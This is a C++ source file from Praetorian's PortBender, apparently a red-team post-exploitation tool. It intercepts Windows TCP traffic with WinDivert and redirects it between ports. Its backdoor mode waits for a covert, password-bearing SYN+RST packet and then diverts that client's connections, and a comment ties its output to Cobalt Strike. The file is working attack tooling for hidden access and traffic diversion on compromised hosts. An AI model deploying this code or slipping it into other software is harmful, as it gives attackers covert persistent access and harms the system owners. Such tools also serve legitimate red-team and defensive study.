// Copyright 2021 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "PortBender.h"

PortBender::PortBender(UINT16 FakeDstPort, UINT16 RedirectPort)
{
	this->FakeDstPort = FakeDstPort;
	this->RedirectPort = RedirectPort;
	this->Mode = OperatingMode::REDIRECTOR;
	this->Password = "";
}

PortBender::PortBender(UINT16 FakeDstPort, UINT16 RedirectPort, std::string Password)
{
	this->FakeDstPort = FakeDstPort;
	this->RedirectPort = RedirectPort;
	this->Mode = OperatingMode::BACKDOOR;
	this->Password = Password;
}

void PortBender::Start()
{
	char filter[512];
	Packet* packet;

	//
	// Create a filter rule to intercept traffic
	//

	sprintf_s(filter,
		sizeof(filter),
		"((inbound and tcp.DstPort == %d )" " or (outbound and tcp.SrcPort == %d ))",
		this->FakeDstPort,
		this->RedirectPort);

	WinDivert* driver = new WinDivert(filter);
	ConnectionManager* connections = new ConnectionManager();

	printf("Configuring redirection of connections targeting %d/TCP to %d/TCP\n",
		this->FakeDstPort, this->RedirectPort);
	fflush(stdout);

	//
	// Loop to process intercepted packets
	//

	while (TRUE)
	{
		packet = driver->Receive();

		//
		// Check if the backdoor password matches and proper flags are set on
		// the TCP packet.
		//

		if (this->Mode == OperatingMode::BACKDOOR) {
			std::string ip = Utilities::AddressToString(packet->ip_header->SrcAddr);
			if (packet->tcp_header->Syn && packet->tcp_header->Rst && !packet->tcp_header->Ack) {
				if (packet->payload != NULL) {
					if (this->Password.length() == packet->payload_len) {
						if (memcmp(this->Password.c_str(), packet->payload, packet->payload_len) == 0) {
							if (connections->IsBackdoorClient(packet) == FALSE) {
								std::string ip = Utilities::AddressToString(packet->ip_header->SrcAddr);
								std::cout << "Client " << ip << " connected to the server" << std::endl;
								connections->AddBackdoorClient(ip);
							} else {
								std::string ip = Utilities::AddressToString(packet->ip_header->SrcAddr);
								std::cout << "Client " << ip << " disconnected from the server" << std::endl;
								connections->RemoveBackdoorClient(ip);
							}
						}
					}
				}
			} 
		}

		//
		// Test if the connection is a redirected connection. We do not
		// want to redirect any existing established connections or un-related
		// connections.
		//

		BOOL redirect = FALSE;
		if (connections->IsRedirectedConnection(packet)) {
			redirect = TRUE;
		}
		
		//
		// If we are running in backdoor mode check if the backdoor is
		// activated for a given IP address
		//

		if (this->Mode == OperatingMode::BACKDOOR) {
			if (redirect) {
				if (connections->IsBackdoorClient(packet)) {
					redirect = TRUE;
				} else {
					redirect = FALSE;
				}
			}
		}

		//
		// Process the intercepted packet
		//

		PVOID new_packet = this->ProcessPacket(packet, redirect);
		if (packet->payload == NULL) {
			driver->Send(new_packet, packet->packet_len, packet->addr);
		} else {
			driver->Send(new_packet, sizeof(TCP_PACKET) + (UINT16)packet->payload_len, packet->addr);
		}
		free(new_packet);

		//
		// Flush stdout regularly so text shows up in Cobalt Strike faster
		//

		fflush(stdout);
		std::cout << std::flush;
	}
}

PVOID PortBender::ProcessPacket(Packet *packet, BOOL redirect) {
	PTCP_PACKET modified_packet = 0;
	UINT16 modified_packet_len;

	//
	// Copy the original packet
	//
	
	modified_packet_len = sizeof(TCP_PACKET) + packet->payload_len;
	modified_packet = (PTCP_PACKET) malloc(modified_packet_len);
	if (modified_packet == NULL) {
		std::cout << "Fatal error - unable to allocate heap memory. Exiting." << std::endl;
		exit(EXIT_FAILURE);
	}

	memcpy(&modified_packet->ip, packet->ip_header, sizeof(modified_packet->ip));
	memcpy(&modified_packet->tcp, packet->tcp_header, sizeof(modified_packet->tcp));

	if (packet->payload != NULL) {
		memcpy(modified_packet->data, packet->payload, packet->payload_len);
	}

	//
	// Redirect the packet if it should be modified
	//

	if (redirect) {
		if (ntohs(packet->tcp_header->DstPort) == this->FakeDstPort) {
			modified_packet->tcp.DstPort = htons(RedirectPort);
		}

		if (ntohs(packet->tcp_header->SrcPort) == RedirectPort) {
			modified_packet->tcp.SrcPort = htons(FakeDstPort);
		}
	}

	//
	// Update the packet checksum
	//

	if (packet->payload != NULL) {
		WinDivertHelperCalcChecksums((PVOID)modified_packet, modified_packet_len, 0);
	} else {
		WinDivertHelperCalcChecksums((PVOID)modified_packet, packet->packet_len, 0);
	}

	return (PVOID)modified_packet;
}
